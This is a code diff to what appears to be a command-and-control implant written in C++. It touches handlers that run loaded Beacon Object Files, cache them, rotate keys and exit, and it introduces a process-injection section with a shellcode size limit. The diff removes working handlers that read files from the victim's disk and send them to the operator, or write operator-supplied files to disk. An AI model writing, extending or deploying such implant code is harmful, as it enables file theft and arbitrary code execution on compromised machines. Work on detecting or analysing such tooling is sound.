@@ -332,6 +332,8 @@ bool handleBofExec(const uint8_t* args, size_t args_len) {
             return false;
         }
 
+        BofCacheManager::instance().insert(bof_id, ctx);
+
         void (*bof_entry)(char*, unsigned long) =
             (void (*)(char*, unsigned long))ctx->entryPoint;
         bof_entry((char*)arg_data, (unsigned long)arg_len);
@@ -433,55 +435,6 @@ bool handleLongRunningBof(const uint8_t* args, size_t args_len) {
     return true;
 }
 
-bool handleFileDownload(const uint8_t* args, size_t args_len) {
-    auto& runtime = getRuntime();
-    auto& networkMgr = runtime.getNetworkManager();
-
-    if (args_len < 2) return false;
-
-    uint16_t path_len = readLE16(args);
-    if (args_len < 2 + path_len * sizeof(wchar_t)) return false;
-
-    const wchar_t* file_path = (const wchar_t*)(args + 2);
-    g_debugPrint("[FILE_DOWNLOAD] path=%.*ls", path_len, file_path);
-
-    DWORD file_size = 0;
-    unsigned char* file_data = readFileFromDisk(getfuncTable(), file_path, &file_size);
-
-    if (file_data) {
-        g_debugPrint("[FILE_DOWNLOAD] Read %lu bytes", (unsigned long)file_size);
-        (void)networkMgr.sendFileContent(file_path, file_data, file_size, 0);
-        __free(file_data);
-    } else {
-        g_debugPrint("[FILE_DOWNLOAD] Failed to read file: %ls", file_path);
-        (void)networkMgr.sendFileContent(file_path, nullptr, 0, 1);
-    }
-    return false;
-}
-
-
-bool handleFileUpload(const uint8_t* args, size_t args_len) {
-    auto& runtime = getRuntime();
-    auto& networkMgr = runtime.getNetworkManager();
-
-    if (args_len < 6) return false;
-
-    uint16_t path_len = readLE16(args);
-    uint32_t file_size = readLE32(args + 2);
-
-    if (args_len < 6 + path_len * sizeof(wchar_t) + file_size) return false;
-
-    const wchar_t* file_path = (const wchar_t*)(args + 6);
-    const uint8_t* file_data = args + 6 + path_len * sizeof(wchar_t);
-
-    g_debugPrint("[FILE_UPLOAD] path=%.*ls size=%lu",
-                 (int)path_len, file_path, (unsigned long)file_size);
-
-    BOOL write_result = writeFileToDisk(getfuncTable(), file_path, file_data, file_size);
-    (void)networkMgr.sendFileWriteResult(write_result ? 0 : 1);
-    return false;
-}
-
 bool handleRotateKey(const uint8_t* args, size_t args_len) {
     auto& runtime = getRuntime();
     auto& networkMgr = runtime.getNetworkManager();
@@ -557,8 +510,6 @@ bool handleExit(const uint8_t* args, size_t args_len) {
 /* ============================================================================
  * Process Injection Handlers
  * ============================================================================ */
-
-#include "../include/injection.h"
 
 static constexpr uint32_t MAX_SHELLCODE_SIZE = 0x100000;  // 1MB max shellcode
 // could be a BOF. TODO
